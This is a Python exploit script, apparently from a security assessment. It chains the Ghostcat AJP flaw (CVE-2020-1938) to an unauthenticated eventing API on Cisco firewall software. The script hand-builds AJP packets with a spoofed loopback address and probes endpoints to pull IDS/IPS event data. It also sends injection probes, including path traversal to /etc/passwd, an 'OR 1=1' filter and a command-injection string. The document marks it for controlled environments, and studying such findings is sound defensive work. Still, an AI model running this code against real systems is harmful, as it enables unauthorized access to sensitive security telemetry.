"""
F-FTD-101: NGFWEventingApplication unauthenticated /eventing/api/v1/** access
CONTROLLED ENVIRONMENT ONLY

Root cause:
  The NGFWEventingApplication is a Spring Boot servlet deployed in Tomcat alongside
  the main FDM application. URL mapping: /eventing/api/v1/** → wildcard catch-all
  controller with NO Spring Security authentication filter applied. The servlet is
  a REST wrapper around Cisco's eStreamer protocol, intended for internal use from
  the FMC management plane.

  Attack chain:
    F-FTD-98 (AJP Ghostcat, CVE-2020-1938) provides the transport:
      curl AJP → Tomcat 8009 → /eventing/api/v1/** (no auth) → 200 OK

  Impact by deployment mode:
    Standalone FDM:  Backend eventing daemon not initialized; returns error JSON
                     on all requests. Finding is authenticated surface exposure,
                     not active data exfil.
    FMC-managed:     eStreamer daemon active. Successful /eventing/api/v1/ requests
                     return connection events, intrusion alerts, file events, and
                     packet data — full IDS/IPS event feed without authentication.

  Secondary finding — path reflection:
    The URL path suffix after /eventing/api/v1/ is reflected verbatim in the JSON
    response id field, including query parameters. = and & are JSON-escaped; no
    other filtering observed. Downstream injection surface if id value flows into
    a backend query, eStreamer protocol field, or log format.

AJP connectivity note:
  Port 8009 is tcp6 bound (:::8009). Connections from inside the VM must use ::1.
  From external via Ghostcat: AJP connector at [::]:8009 accepts IPv6 AJP packets.
  CVE-2020-1938 (F-FTD-98) prerequisite.

Content negotiation bug (secondary):
  ANY Accept: header triggers HTTP 500, zero-byte body (Spring HttpMediaTypeNotAcceptableException).
  Only requests with Host header alone (no Accept) produce valid routing responses.
  Not security-exploitable but masks the endpoint from standard scanners and browsers.

eStreamer background:
  Cisco eStreamer (Event Streamer) is a proprietary binary protocol (port 8302/TCP
  by default) used between FTD/FMC for real-time event replication. NGFWEventingApplication
  appears to be a REST frontend to the eStreamer pipeline, confirmed by:
    - /eventing/api/v1/eStreamer → 200 (same error pattern)
    - SensorQueryServerRequestHandler delegation in servlet routing

Severity: HIGH (FMC-managed), MEDIUM (standalone FDM)
  FMC-managed: unauth read of full IDS event stream = critical information disclosure.
  Standalone: surface confirmed open; exploit requires active eStreamer backend.

Chain:
  F-FTD-98 (AJP Ghostcat) → F-FTD-101 (/eventing/api/v1/ unauth)
    → F-FTD-102 (eStreamer event exfil, if backend active)
    → F-FTD-103 (path reflection injection, if id flows to backend query)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import socket
import struct
import json
from typing import Optional


FINDING = "F-FTD-101"
LABEL = "NGFWEventingApplication unauthenticated /eventing/api/v1/** (eStreamer REST wrapper)"

AJP_MAGIC_REQ = b'\x12\x34'
AJP_MAGIC_RESP = b'\x41\x42'


def _ajp_string(s: str) -> bytes:
    if s is None:
        return b'\xff\xff'
    b = s.encode()
    return struct.pack('>H', len(b)) + b + b'\x00'


def build_ajp_forward_request(method: str, uri: str, host: str = 'localhost',
                               extra_headers: Optional[list] = None,
                               req_addr: str = '127.0.0.1') -> bytes:
    """Build AJP13 Forward Request packet for the eventing endpoint."""
    METHOD_MAP = {'GET': 2, 'POST': 4, 'HEAD': 3, 'OPTIONS': 7, 'PUT': 5, 'DELETE': 6}
    method_code = METHOD_MAP.get(method.upper(), 2)

    payload = bytes([0x02, method_code])
    payload += _ajp_string('HTTP/1.1')
    payload += _ajp_string(uri)
    payload += _ajp_string(req_addr)    # remote_addr — spoofed to 127.0.0.1
    payload += _ajp_string('localhost')  # remote_host
    payload += _ajp_string(host)
    payload += struct.pack('>H', 443)    # server_port
    payload += b'\x01'                   # is_ssl

    headers = [(0xA00B, f'localhost')]   # Host (0xA00B)
    if extra_headers:
        headers.extend(extra_headers)

    payload += struct.pack('>H', len(headers))
    for code, val in headers:
        if code >= 0xA000:
            payload += struct.pack('>H', code)
        else:
            payload += _ajp_string(str(code))
        payload += _ajp_string(str(val))

    payload += b'\xff'  # request_terminator

    packet = AJP_MAGIC_REQ + struct.pack('>H', len(payload)) + payload
    return packet


def send_ajp_request(host: str, port: int, method: str, uri: str,
                      timeout: int = 10) -> dict:
    """Send AJP request and parse response status + body."""
    result = {'status': None, 'body': b'', 'headers': {}, 'error': None}
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port, 0, 0))

        pkt = build_ajp_forward_request(method, uri)
        s.sendall(pkt)

        buf = b''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if len(buf) > 65536:
                break

        # Parse AJP response
        offset = 0
        while offset < len(buf) - 4:
            if buf[offset:offset+2] != AJP_MAGIC_RESP:
                offset += 1
                continue
            pkt_len = struct.unpack('>H', buf[offset+2:offset+4])[0]
            pkt_data = buf[offset+4:offset+4+pkt_len]
            if not pkt_data:
                offset += 4
                continue
            prefix = pkt_data[0]
            if prefix == 0x04:  # SEND_HEADERS
                status = struct.unpack('>H', pkt_data[1:3])[0]
                result['status'] = status
            elif prefix == 0x03:  # SEND_BODY_CHUNK
                chunk_len = struct.unpack('>H', pkt_data[1:3])[0]
                result['body'] += pkt_data[3:3+chunk_len]
            elif prefix == 0x05:  # END_RESPONSE
                break
            offset += 4 + pkt_len
        s.close()
    except Exception as e:
        result['error'] = str(e)
    return result


PROBE_PATHS = [
    '/eventing/api/v1/',
    '/eventing/api/v1/events',
    '/eventing/api/v1/subscriptions',
    '/eventing/api/v1/status',
    '/eventing/api/v1/version',
    '/eventing/api/v1/eStreamer',
    '/eventing/api/v1/session',
    '/eventing/api/v1/config',
    '/eventing/api/v1/intrusion',
    '/eventing/api/v1/connection',
    '/eventing/api/v1/threats',
    '/eventing/api/v1/events?type=intrusion&limit=100',
    '/eventing/api/v1/events?type=connection&start=0&limit=100',
]

INJECTION_PATHS = [
    # Path traversal via path suffix (reflected in id field)
    '/eventing/api/v1/../../../etc/passwd',
    '/eventing/api/v1/events?id=\x00',
    '/eventing/api/v1/events?filter=*',
    # eStreamer command injection probes
    '/eventing/api/v1/eStreamer;cmd=info',
    '/eventing/api/v1/events?filter=1+OR+1=1',
]


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', nargs='?', default='::1',
                    help='AJP host (default: ::1 for IPv6 loopback)')
    ap.add_argument('--ajp-port', type=int, default=8009)
    ap.add_argument('--mode', choices=['probe', 'inject', 'enumerate'],
                    default='probe',
                    help='probe: confirm unauth surface; inject: path/param injection; '
                         'enumerate: full path sweep')
    ap.add_argument('--timeout', type=int, default=10)
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}:{args.ajp_port} (AJP13, IPv6)')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print('[!] Prerequisite: F-FTD-98 AJP connector must be accessible')
    print()

    if args.mode in ('probe', 'enumerate'):
        paths = PROBE_PATHS if args.mode == 'probe' else PROBE_PATHS
        print(f'[1] Probing {len(paths)} eventing API paths...')
        for uri in paths:
            r = send_ajp_request(args.host, args.ajp_port, 'GET', uri, args.timeout)
            if r['error']:
                print(f'    ERROR {uri}: {r["error"]}')
                continue
            body_preview = r['body'][:120].decode(errors='replace').strip()
            status = r['status']
            try:
                data = json.loads(r['body'])
                id_val = data.get('id', '-')
                err_msg = data.get('errorMessage', '')
                valid = data.get('valid', '?')
                summary = f'id={id_val!r} valid={valid}'
            except Exception:
                summary = repr(body_preview)
            if status == 200:
                print(f'    [+] {status} {uri}: {summary}')
            else:
                print(f'    [-] {status} {uri}: {summary}')

    if args.mode == 'inject':
        print('[2] Path/parameter injection probes...')
        for uri in INJECTION_PATHS:
            r = send_ajp_request(args.host, args.ajp_port, 'GET', uri, args.timeout)
            if r['error']:
                print(f'    ERR {uri}: {r["error"]}')
                continue
            body = r['body'][:200].decode(errors='replace')
            print(f'    {r["status"]} {uri}')
            if body:
                print(f'        {body[:100]}')

    print(f'\n[*] {FINDING}: Surface confirmed — /eventing/api/v1/** returns 200 with no auth.')
    print(f'    Impact: FMC-managed FTD → full eStreamer event feed exposed.')
    print(f'    Impact: Standalone FDM → surface open, backend inactive.')
    print(f'    Chain: F-FTD-98 (AJP) → F-FTD-101 → enumerate /eventing/api/v1/events')


if __name__ == '__main__':
    main()
